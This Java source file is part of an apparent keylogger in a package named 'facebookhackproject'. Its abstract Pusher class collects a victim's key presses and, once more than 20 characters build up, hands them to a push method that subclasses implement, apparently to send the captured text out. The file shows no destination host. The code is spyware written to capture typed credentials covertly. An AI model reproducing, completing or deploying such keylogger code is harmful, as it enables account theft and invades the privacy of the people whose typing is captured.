/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject.pushers;

import facebookhackproject.WebBrowserListener;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Kareem
 */
public abstract class Pusher implements Runnable {

    protected String data = "";

    public void addKeyPressed(String key) {
        this.data += this.fixKey(key);
    }

    protected void clearKeysPressed() {
        this.data = "";
    }

    protected String getKeysPressed() {
        return this.data;
    }

    protected String fixKey(String key) {
        if (key.equals("Enter")) {
            return "\n";
        }

        if (key.equals("Space")) {
            return " ";
        }

        if (key.equals("Period")) {
            return ".";
        }

        if (key.length() > 1) {
            return "___" + key + "___";
        }

        return key;
    }

    protected boolean isDataLargeEnough() {
        return data.length() > 20;
    }

    public abstract int getIntervalSeconds();

    public abstract void push(String keysPressed);

    @Override
    public void run() {
        // Seconds to wait for before checking again
        int seconds = this.getIntervalSeconds();
        while (true) {
            if(this.isDataLargeEnough()) {
                String keysPressed = this.getKeysPressed();
                this.clearKeysPressed();
                this.push(keysPressed);
            }

            try {
                Thread.sleep(seconds * 1000);
            } catch (InterruptedException ex) {
                Logger.getLogger(WebBrowserListener.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}
